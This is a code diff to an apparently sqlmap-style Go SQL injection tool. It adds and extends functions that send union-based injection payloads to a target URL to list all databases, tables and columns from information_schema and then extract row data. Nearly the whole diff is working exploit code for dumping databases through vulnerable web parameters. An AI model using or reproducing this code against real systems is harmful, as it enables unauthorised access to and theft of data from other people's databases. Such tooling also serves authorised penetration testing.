@@ -29,16 +29,16 @@ func DetectErrorBasedSqlInject(url string, method string) (bool, string) {
 	return false, ""
 }
 
-func GetSuffix(target string) string {
+func GetSuffix(target string) (bool, string) {
 	payload := "%20AnD%20'SQLMaP'='SQLMaP'%20--+"
 	_, _, defaultBody := util.Request("GET", target, nil, nil)
 	for _, v := range constant.SuffixList {
 		_, _, body := util.Request("GET", target+v+payload, nil, nil)
 		if string(defaultBody) == string(body) {
-			return v
+			return true, v
 		}
 	}
-	return ""
+	return false, ""
 }
 
 func GetOrderByNum(suffix string, url string) int {
@@ -109,7 +109,7 @@ func GetVersion(pos Pos, suffix string, url string, key int) string {
 	return ""
 }
 
-func GetDatabase(pos Pos, suffix string, url string, key int) string {
+func GetCurrentDatabase(pos Pos, suffix string, url string, key int) string {
 	url = url + "0"
 	database := "union%20select"
 	databaseSql := bytes.Buffer{}
@@ -126,13 +126,38 @@ func GetDatabase(pos Pos, suffix string, url string, key int) string {
 		innerR := []rune(body)
 		innerRes := string(innerR[pos.StartIndex:])
 		result := strings.Split(innerRes, "<")[0]
-		log.Info("Current Database:" + result)
+		log.Info("current database:" + result)
 		return result
 	}
 	return ""
 }
 
-func GetAllTables(pos Pos, suffix string, url string, key int) string {
+func GetAllDatabases(pos Pos, suffix string, url string, key int) string {
+	url = url + "0"
+	database := "union%20select"
+	databaseSql := bytes.Buffer{}
+	databaseSql.WriteString(url + suffix + constant.Space + database + constant.Space)
+	for i := 1; i < key; i++ {
+		databaseSql.WriteString("group_concat(schema_name),")
+	}
+	r := []rune(databaseSql.String())
+	res := string(r[:len(r)-1])
+	fromSql := "from%20information_schema.schemata%20"
+	tablePayload := res + constant.Space + fromSql + constant.Annotator
+	code, _, tempBody := util.Request(constant.DefaultMethod, tablePayload, nil, nil)
+	if code != -1 {
+		body := string(tempBody)
+		innerR := []rune(body)
+		innerRes := string(innerR[pos.StartIndex:])
+		result := strings.Split(innerRes, "<")[0]
+		log.Info("get databases success")
+		util.PrintDatabases(util.ConvertString(result))
+		return result
+	}
+	return ""
+}
+
+func GetAllTables(pos Pos, suffix string, url string, key int, database string) string {
 	url = url + "0"
 	table := "union%20select"
 	tableSql := bytes.Buffer{}
@@ -142,7 +167,7 @@ func GetAllTables(pos Pos, suffix string, url string, key int) string {
 	}
 	r := []rune(tableSql.String())
 	res := string(r[:len(r)-1])
-	fromSql := "from%20information_schema.tables%20where%20table_schema=database()%20"
+	fromSql := "from%20information_schema.tables%20where%20table_schema='" + database + "'%20"
 	tablePayload := res + constant.Space + fromSql + constant.Annotator
 	code, _, tempBody := util.Request("GET", tablePayload, nil, nil)
 	if code != -1 {
@@ -150,13 +175,14 @@ func GetAllTables(pos Pos, suffix string, url string, key int) string {
 		innerR := []rune(body)
 		innerRes := string(innerR[pos.StartIndex:])
 		result := strings.Split(innerRes, "<")[0]
-		log.Info("Tables:" + result)
+		log.Info("get tables success")
+		util.PrintTables(util.ConvertString(result))
 		return result
 	}
 	return ""
 }
 
-func GetColumns(pos Pos, suffix string, url string, key int, tableName string) string {
+func GetColumns(pos Pos, suffix string, url string, key int, database string, tableName string) string {
 	url = url + "0"
 	column := "union%20select"
 	columnSql := bytes.Buffer{}
@@ -167,7 +193,7 @@ func GetColumns(pos Pos, suffix string, url string, key int, tableName string) s
 	r := []rune(columnSql.String())
 	res := string(r[:len(r)-1])
 	fromSql := "from%20information_schema.columns%20where%20table_name='" + tableName +
-		"'%20and%20table_schema=database()%20"
+		"'%20and%20table_schema='" + database + "'%20"
 	columnPayload := res + constant.Space + fromSql + constant.Annotator
 	code, _, tempBody := util.Request("GET", columnPayload, nil, nil)
 	if code != -1 {
@@ -175,13 +201,14 @@ func GetColumns(pos Pos, suffix string, url string, key int, tableName string) s
 		innerR := []rune(body)
 		innerRes := string(innerR[pos.StartIndex:])
 		result := strings.Split(innerRes, "<")[0]
-		log.Info("Columns:" + result)
+		log.Info("get columns success")
+		util.PrintColumns(util.ConvertString(result))
 		return result
 	}
 	return ""
 }
 
-func GetData(pos Pos, suffix string, url string, key int, tableName string, columns []string) {
+func GetData(pos Pos, suffix string, url string, key int, database string, tableName string, columns []string) {
 	url = url + "0"
 	data := "union%20select"
 	dataSql := bytes.Buffer{}
@@ -197,7 +224,7 @@ func GetData(pos Pos, suffix string, url string, key int, tableName string, colu
 	}
 	r := []rune(dataSql.String())
 	res := string(r[:len(r)-1])
-	fromSql := "from%20" + tableName
+	fromSql := "from%20" + database + "." + tableName
 	columnPayload := res + constant.Space + fromSql + constant.Annotator
 	code, _, tempBody := util.Request("GET", columnPayload, nil, nil)
 	if code != -1 {
